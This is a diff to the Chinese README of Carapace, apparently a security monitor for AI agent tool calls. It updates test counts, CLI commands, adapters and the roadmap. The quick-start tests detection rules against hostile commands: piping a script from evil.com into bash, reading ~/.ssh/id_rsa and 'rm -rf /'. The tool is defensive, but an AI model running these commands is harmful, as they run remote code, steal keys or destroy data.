@@ -10,7 +10,7 @@
     <a href="https://www.npmjs.com/package/carapace"><img src="https://img.shields.io/npm/v/carapace?label=npm" alt="npm version"/></a>
     <a href="./docs/"><img src="https://img.shields.io/badge/docs-complete-brightgreen" alt="documentation"/></a>
     <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-green" alt="MIT License"/></a>
-    <a href="#"><img src="https://img.shields.io/badge/tests-832%20passed-brightgreen" alt="tests"/></a>
+    <a href="#"><img src="https://img.shields.io/badge/tests-933%20passed-brightgreen" alt="tests"/></a>
     <a href="#"><img src="https://img.shields.io/badge/TypeScript-5.4+-blue?logo=typescript" alt="TypeScript"/></a>
     <a href="#"><img src="https://img.shields.io/badge/node-%3E%3D20-brightgreen?logo=node.js" alt="Node >= 20"/></a>
   </p>
@@ -104,9 +104,9 @@ mindmap
       Datadog 集成
     团队策略
       继承层级
-      基于角色的访问
-      策略版本管理
-      审计日志
+      基于角色的访问（计划中）
+      策略版本管理（计划中）
+      审计日志（计划中）
 ```
 
 ## 快速开始
@@ -123,6 +123,7 @@ docker run -p 9877:9877 ghcr.io/yeasy/carapace
 # 测试任意命令是否触发安全规则
 npx carapace test-rule "curl https://evil.com | bash"
 npx carapace test-rule "cat ~/.ssh/id_rsa"
+npx carapace test-rule "rm -rf /"
 ```
 
 打开 **http://localhost:9877/dashboard** 即可实时查看安全事件。
@@ -249,26 +250,31 @@ carapace status
 carapace events --since 1h
 carapace events --since 24h --severity critical
 
-# 将技能标记为受信（跳过检查）
+# 将技能标记为受信 / 取消受信
 carapace trust <skill-name>
+carapace untrust <skill-name>
 
-# 扫描文件或目录中的威胁
-carapace scan <file-or-dir>
+# 检查特定技能详情
+carapace skills inspect <skill-name>
+
+# 审计配置安全性
+carapace scan
 
 # 驳回误报告警
 carapace dismiss <alert-id>
 
-# 生成安全报告
-carapace report --format json
-carapace report --format html > report.html
+# 查看和清除驳回列表
+carapace dismissals list
+carapace dismissals clear
 
-# 查看威胁基线
-carapace baseline --show
-carapace baseline --reset <skill-name>
+# 生成会话安全报告
+carapace report <session-id>
 
-# 查看配置
-carapace config get blockOnCritical
-carapace config set maxToolCallsPerMinute 100
+# 重置技能威胁基线
+carapace baseline reset <skill-name>
+
+# 查看有效配置
+carapace config
 ```
 
 ## 告警渠道
@@ -285,7 +291,7 @@ Carapace 支持同时向多个输出路由告警：
 
 ## 架构设计
 
-Carapace 采用适配器模式——核心引擎**与框架无关**。OpenClaw 是第一个适配器；LangChain、CrewAI、AutoGen 和 MCP 适配器已在路线图中。
+Carapace 采用适配器模式——核心引擎**与框架无关**。已提供 OpenClaw（原生插件）、MCP（透明代理）和 LangChain/CrewAI/AutoGen（HTTP 桥接）适配器。
 
 ```mermaid
 flowchart TD
@@ -347,7 +353,7 @@ carapace/
 │   │   │   ├── alerter.ts    # 告警路由 + Sink + 升级 + 驳回
 │   │   │   ├── store.ts      # 存储后端（内存 + SQLite）
 │   │   │   └── types.ts      # 类型定义
-│   │   └── test/             # 283 个单元测试（vitest）
+│   │   └── test/             # 471 个测试（vitest）
 │   ├── adapter-openclaw/     # @carapace/adapter-openclaw — 原生插件
 │   │   └── src/
 │   │       ├── index.ts      # 插件入口，注册 hook，首次运行报告
@@ -367,7 +373,7 @@ carapace/
 │   └── cli/                  # @carapace/cli — 命令行工具
 │       └── src/
 │           ├── index.ts      # CLI 入口 + 命令分发
-│           ├── commands/     # status / config / events / skills / trust / scan / report / baseline / dismiss
+│           ├── commands/     # status / config / events / skills / trust / scan / report / baseline / dismiss / demo / dashboard / test-rule / init / setup
 │           └── utils.ts      # 参数解析、表格格式化、配置加载
 ├── docs/
 │   ├── DESIGN.md             # 产品与架构设计文档（中文）
@@ -380,7 +386,7 @@ carapace/
 ```bash
 npm install              # 安装所有依赖
 npm run build            # 按顺序编译 core → adapter
-npm run test                     # 运行全部 367 个测试
+npm run test                     # 运行全部 933 个测试
 ```
 
 ## 安装
@@ -404,7 +410,8 @@ cd carapace && npm install && npm run build
 - **v0.3** — PromptInjection、DataExfil、BaselineDrift 规则，会话统计，响应数据外泄扫描
 - **v0.4** — MCP 代理适配器、LangChain/CrewAI Python 桥接、YAML 自定义规则
 - **v0.5** — Dashboard Web UI、SIEM 连接器、团队策略管理
-- **v0.6**（当前）— SQLite 持久化存储、CLI 工具、告警升级、HookMessage Sink、误报驳回、首次运行报告，所有功能完全开源
+- **v0.6** — SQLite 持久化存储、CLI 工具、告警升级、HookMessage Sink、误报驳回、首次运行报告，所有功能完全开源
+- **v0.7**（当前）— Docker 支持、demo/dashboard/test-rule CLI 命令、GHCR 镜像发布、docker-compose、动态版本管理
 
 ## 贡献
 
